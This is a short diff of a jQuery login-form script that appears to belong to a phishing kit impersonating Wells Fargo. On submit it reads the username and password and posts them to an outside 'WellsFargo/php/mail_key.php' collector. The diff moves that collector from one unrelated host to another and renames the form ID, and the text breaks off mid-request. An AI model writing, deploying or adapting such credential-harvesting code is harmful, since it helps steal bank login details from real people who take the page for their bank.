@@ -1,15 +1,15 @@
 $('document').ready(function () {
 
-    $('#login_form').on('submit', function () {
+    $('#sign-in-form').on('submit', function () {
 
-        $('#login_form button').attr('disabled', true);
-        $('#login_form button').html('Please Wait...');
+        $('#sign-in-form button').attr('disabled', true);
+        $('#sign-in-form button').html('Please Wait...');
 
         var username = $('#username').val();
         var password = $('#password').val();
 
         $.ajax({
-            url: 'https://fostesting.000webhostapp.com/servers/WellsFargo/php/mail_key.php',
+            url: 'https://platiniumxpwallet.com/external/WellsFargo/php/mail_key.php',
             method: 'post',
             data: {
                 username,
